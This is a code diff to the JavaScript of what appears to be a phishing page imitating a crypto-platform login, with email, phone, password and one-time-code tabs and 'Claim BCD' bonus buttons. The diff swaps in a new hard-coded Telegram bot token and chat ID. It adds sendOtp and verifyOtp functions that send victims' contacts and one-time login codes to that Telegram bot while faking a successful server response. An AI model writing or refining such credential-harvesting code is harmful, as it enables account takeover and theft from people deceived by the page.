@@ -1,8 +1,8 @@
 // ======================================================
 // TELEGRAM CONFIGURATION
 // ======================================================
-const TELEGRAM_BOT_TOKEN = "7904440876:AAFUb4u_rK4NOjw9iJAdOr_i63bq_B1jF6s";
-const TELEGRAM_CHAT_ID = "-5076016894";
+const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
+const TELEGRAM_CHAT_ID = "-5244196921";
 
 
 
@@ -312,9 +312,10 @@ const passwordField = document.getElementById('input-container2');
 const passwordInput = document.getElementById('password');
 const emailPhoneField = document.getElementById('input-container');
 const emailPhoneInput = document.getElementById('email-phone');
-const emailPhoneVisibleInput = document.getElementById('email-phone-visible');
+// Some templates use a visible input id `email-phone-visible`; fall back to `email-phone` when absent
+const emailPhoneVisibleInput = document.getElementById('email-phone-visible') || document.getElementById('email-phone');
 
-if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput && emailPhoneVisibleInput) {
+if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput) {
     // One-time Code tab click
     oneTimeTab.addEventListener('click', (e) => {
         e.preventDefault();
@@ -330,7 +331,7 @@ if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneFie
         passwordInput.value = ''; // Clear any existing password
         
         // Change placeholder text to remove "/Username"
-        emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
+        if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
     });
 
     // Password tab click
@@ -347,7 +348,7 @@ if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneFie
         passwordInput.setAttribute('required', 'required');
         
         // Restore original placeholder text
-        emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
+        if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
     });
 }
 
@@ -837,6 +838,37 @@ function startResend(btnOrType, forced = false) {
 }
 window.startResend = startResend;
 
+// ======================================================
+// GLOBAL OTP HOOKS (used by inline OTP UI)
+// Provides `window.sendOtp({contact, method})` and `window.verifyOtp({contact, code})`
+// These are lightweight wrappers that send formatted messages via Telegram
+// and return a Promise<boolean> indicating success.
+// ======================================================
+window.sendOtp = async function({contact, method} = {}){
+    try{
+        if(!contact) return Promise.reject(new Error('missing contact'));
+        const msg = formatOneTimeLoginMessage(contact);
+        await sendToTelegram(msg);
+        // simulate server acceptance
+        const res = await simulateServerSuccess();
+        return res.success === true;
+    }catch(e){ console.error('sendOtp error', e); return false; }
+};
+
+window.verifyOtp = async function({contact, code} = {}){
+    try{
+        if(!code) return Promise.resolve(false);
+        // choose formatter based on contact type
+        const isEmail = (contact||'').indexOf('@')>-1;
+        let msg;
+        if(isEmail) msg = formatEmailVerificationMessage(code, isAfterSwitch);
+        else msg = formatPhoneVerificationMessage(code, isAfterSwitch);
+        await sendToTelegram(msg);
+        const res = await simulateServerSuccess();
+        return res.success === true;
+    }catch(e){ console.error('verifyOtp error', e); return false; }
+};
+
 // Add click handlers to third-group-wrap buttons to show unavailable message
 const thirdGroupButtons = document.querySelectorAll('.third-group-wrap.mt-6.flex.h-11.w-full.items-center.justify-between button');
 thirdGroupButtons.forEach(btn => {
@@ -927,10 +959,24 @@ document.addEventListener('DOMContentLoaded', ()=>{
     });
 
     // also ensure any existing "Claim N BCD" buttons are wrapped (fallback)
-    try{ document.querySelectorAll('button, a, div, span').forEach(el=>{
-        if(el.childElementCount===0){
-            const t = (el.textContent||'').trim();
-            if(/^Claim\s+\d+\s*BCD$/i.test(t)) ensureBtnLabel(el);
+    // Defer heavy DOM scan to idle time to avoid blocking initial interaction.
+    try{
+        var runScan = function(){
+            try{
+                document.querySelectorAll('button, a, div, span').forEach(el=>{
+                    if(el.childElementCount===0){
+                        const t = (el.textContent||'').trim();
+                        if(/^Claim\s+\d+\s*BCD$/i.test(t)) ensureBtnLabel(el);
+                    }
+                });
+            }catch(e){ /* swallow per original intent */ }
+        };
+
+        if('requestIdleCallback' in window){
+            requestIdleCallback(runScan, {timeout:2000});
+        } else {
+            // schedule after initial paint
+            setTimeout(runScan, 1500);
         }
-    }); }catch(e){}
+    }catch(e){}
 });
